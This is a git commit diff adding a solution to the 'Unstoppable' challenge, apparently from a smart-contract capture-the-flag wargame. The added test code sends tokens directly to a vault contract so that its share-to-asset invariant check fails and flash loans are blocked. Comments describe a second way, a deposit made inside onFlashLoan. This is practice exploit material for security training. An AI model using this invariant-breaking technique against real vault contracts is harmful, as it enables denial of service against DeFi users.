09fae1efa717b0e4c7e4919554472ed98568840c
Mahika <mahika@Mahikas-MacBook-Pro.local>
2023-07-19 07:29:53 +0530

    solved unstoppable challenge 1

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -45,6 +45,15 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Break this: if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
+        // Basically any way to change the 1:1 ratio between shares and asset works
+        
+        const myToken = await ethers.getContractAt("DamnValuableToken", token.address, player);
+        await myToken.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
+
+        // Another way is to do a deposit inside the onFlashLoan function because in that stage,
+        // the asset balance will be different and the share supply, and minting of shares will occur with a different rate
+        // thus the 1:1 ratio between assets and shares will be disturbed
     });
 
     after(async function () {
